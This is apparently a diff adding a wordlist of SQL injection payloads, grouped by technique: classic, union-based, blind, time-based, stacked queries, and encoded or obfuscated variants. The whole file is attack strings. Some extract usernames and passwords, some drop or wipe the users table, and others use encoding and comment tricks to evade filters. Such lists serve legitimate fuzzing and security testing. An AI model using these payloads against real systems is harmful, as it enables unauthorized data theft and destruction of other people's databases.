@@ -1,0 +1,64 @@
+# SQL Injection Payloads
+# Classic SQL injection
+' OR '1'='1
+' OR 1=1--
+admin'--
+admin' #
+
+# Union-based
+1' UNION SELECT NULL, NULL--
+1' UNION SELECT username, password FROM users--
+' UNION ALL SELECT NULL, NULL, NULL--
+
+# Blind SQL injection
+' AND 1=1--
+' AND 1=2--
+1' AND SLEEP(5)--
+1' AND BENCHMARK(10000000,MD5('A'))--
+
+# Boolean-based blind
+1' AND (SELECT COUNT(*) FROM users) > 0--
+1' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
+
+# Time-based blind
+1'; WAITFOR DELAY '00:00:05'--
+1' AND IF(1=1, SLEEP(5), 0)--
+
+# Stacked queries
+1'; DROP TABLE users--
+1'; DELETE FROM users WHERE 1=1--
+
+# Comment variations
+1'/* comment */OR/**/1=1--
+1'/**/UNION/**/SELECT/**/NULL--
+
+# Case variations
+' oR '1'='1
+' UnIoN SeLeCt NULL--
+
+# Encoded payloads
+%27%20OR%20%271%27%3D%271
+%27%20UNION%20SELECT%20NULL--
+
+# Double encoding
+%2527%20OR%20%25271%2527%253D%25271
+
+# Error-based
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT username FROM users LIMIT 1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+
+# Second-order
+admin'||'
+admin'+'
+
+# String concatenation
+' + 'a'='a
+'||'1'='1
+
+# Numeric injection
+1 OR 1=1
+1 AND 1=1
+1 AND 1=2
+
+# Subquery injection
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+1' AND EXISTS(SELECT * FROM users)--
